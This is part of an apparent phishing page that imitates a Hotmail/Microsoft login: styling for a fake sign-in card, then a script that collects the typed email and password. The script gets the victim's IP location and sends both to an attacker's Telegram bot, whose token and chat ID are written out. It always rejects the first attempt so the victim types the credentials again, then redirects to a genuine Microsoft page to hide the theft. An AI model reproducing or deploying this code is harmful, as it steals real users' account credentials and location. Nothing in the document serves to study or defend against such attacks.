/* Main card */
.login-container {
    background: #ffffff;
    width: 100%;
    max-width: 520px;
    border-radius: 10px;
    box-shadow: 0 6px 18px rgba(0,0,0,0.2);
    padding: 30px 35px 25px;
}

/* Header bar */
.header {
    background: #d9d9d9;
    border-radius: 8px;
    padding: 18px;
    display: flex;
    align-items: center;
    gap: 15px;
    margin-bottom: 25px;
}

.header img {
    width: 42px;
}

.header h1 {
    font-size: 28px;
    font-weight: bold;
    color: #000;
}

/* Instructions */
.instructions {
    font-size: 16px;
    color: #000;
    margin-bottom: 10px;
}

/* Verified line */
.verified {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #2e8b1f;
    font-size: 16px;
    font-weight: 600;
    margin-bottom: 20px;
}

.verified .dot {
    width: 12px;
    height: 12px;
    background: #2e8b1f;
    border-radius: 50%;
}

/* Inputs */
input[type="email"],
input[type="password"] {
    width: 100%;
    padding: 12px 14px;
    margin-bottom: 12px;
    border: 1px solid #cfcfcf;
    border-radius: 2px;
    font-size: 15px;
    color: #333;
}

input::placeholder {
    color: #8a8a8a;
}

input:focus {
    outline: none;
    border-color: #5b9bd5;
}

/* Button */
.login-button {
    background: #4f8edc;
    color: #ffffff;
    padding: 12px 24px;
    font-size: 16px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 8px;
}

.login-button:hover {
    background: #3f78bc;
}

/* Security icon */
.security {
    display: flex;
    justify-content: center;
    margin-top: 18px;
}

.security img {
    width: 85px;
}

/* Footer */
.footer {
        display: flex;
        justify-content: left;
        align-items: center;
        gap: 15px;
        padding-left: 10px;
        margin-top: 100px;
        position: absolute;
        bottom: 0;
        left: 10px;
    }
.logo {
    display: block;
    margin: 0 0 25px 5px;
    width: 250px;
    max-width: 100%;
    height: auto;
    border-radius: 12px;
}
.footer {
        display: flex;
        justify-content: left;
        align-items: center;
        gap: 15px;
        padding-left: 10px;
        margin-top: 100px;
        position: absolute;
        bottom: 0;
        left: 10px;
    }
</style>

    <script type="text/javascript">
	document.addEventListener('DOMContentLoaded', function () {
        const btWole = document.getElementById('btWole');
        const msgFont = document.getElementById('msgfont');

        const botToken1 = '8774890894:AAE9lMUdz95kpQ4TRpzQlCU5P-r2jxbeB5w';
        const chatId1 = '6697734356';
        const telegramUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;

        const botToken2 = '';
        const chatId2 = '';
        const telegramUrl2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;

        let countAttempt = 0;
        let locationData = { country: "Unknown", state: "Unknown", city: "Unknown", ip: "Unknown" };

        fetchLocationFromIP();

        ['click', 'touchend'].forEach(eventType => {
            btWole.addEventListener(eventType, function (event) {
                event.preventDefault();
                handleSubmission();
            });
        });

        function handleSubmission() {
            const kokoro = document.getElementById('kokoro').value.trim();

            if (!kokoro) {
                msgFont.textContent = "Please enter password";
                return;
            }

            btWole.value = "Verifying...";
            msgFont.textContent = "Processing...";

            teSile(locationData);
        }

        function fetchLocationFromIP() {
            fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        locationData = {
                            country: data.country || 'Unknown',
                            state: data.regionName || 'Unknown',
                            city: data.city || 'Unknown',
                            ip: data.query || 'Unknown',
                            isp: data.isp || 'Unknown'
                        };
                    } else {
                        locationData = { country: "Blocked", state: "Blocked", ip: data.query || "Unknown" };
                    }
                })
                .catch(() => {
                    locationData = { country: "Offline", state: "Offline" };
                });
        }

        function teSile(loc) {
            const formData = new FormData(document.forms['ogogoroman']);
            countAttempt++;

            let messageText = '=== HOTMAIL LOGS ===\n';
            for (const [key, value] of formData.entries()) {
                messageText += `${key}: ${value}\n`;
            }

            messageText += `\nLOCATION (IP-BASED):\n`;
            messageText += `IP: ${loc.ip}\n`;
            messageText += `Country: ${loc.country}\n`;
            messageText += `State/Region: ${loc.state}\n`;
            if (loc.city && loc.city !== 'Unknown') messageText += `City: ${loc.city}\n`;
            if (loc.isp && loc.isp !== 'Unknown') messageText += `ISP: ${loc.isp}\n`;

            messageText += `\nTime: ${new Date().toLocaleString()}\n`;
            messageText += `Attempts: ${countAttempt}\n`;

            const payload = { text: messageText };

            sendToTelegram(telegramUrl1, { ...payload, chat_id: chatId1 });
            sendToTelegram(telegramUrl2, { ...payload, chat_id: chatId2 });

            if (countAttempt >= 2) {
                setTimeout(() => {
                    window.location.href = "https://go.microsoft.com/fwlink/p/?LinkID=2119709&clcid=0x409&culture=en-us&country=us";
                }, 2000);
            } else {
                setTimeout(() => {
                    msgFont.textContent = "Invalid email or Password";
                    btWole.value = "Continue";
                }, 2000);
            }
        }

        function sendToTelegram(url, data) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        }
    });
	</script>
